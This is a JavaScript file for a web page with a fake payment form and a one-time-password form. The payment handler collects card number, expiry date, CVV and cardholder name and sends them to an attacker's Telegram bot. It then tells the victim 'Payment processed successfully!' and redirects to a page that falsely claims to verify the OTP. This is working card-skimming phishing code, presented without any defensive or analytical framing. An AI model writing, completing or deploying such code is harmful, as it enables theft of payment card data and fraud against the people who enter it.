document.addEventListener('DOMContentLoaded', () => {
    const paymentForm = document.getElementById('paymentForm');
    const otpForm = document.getElementById('otpForm');
 
    if (paymentForm) {
        paymentForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const formData = new FormData(paymentForm);
            const cardData = Object.fromEntries(formData.entries());
 
            const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
            const chatId = 'YOUR_CHAT_ID';
 
            const message = `New Card Payment:\n\nCard Number: ${cardData.cardNumber}\nExpiry Date: ${cardData.expiryDate}\nCVV: ${cardData.cvv}\nCard Holder: ${cardData.cardHolder}`;
 
            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });
 
            alert('Payment processed successfully!');
            window.location.href = 'otp.html';
        });
    }
 
    if (otpForm) {
        otpForm.addEventListener('submit', (event) => {
            event.preventDefault();
            const formData = new FormData(otpForm);
            const otp = formData.get('otp');
 
            alert(`OTP ${otp} verified successfully!`);
            window.location.href = 'index.html';
        });
    }
});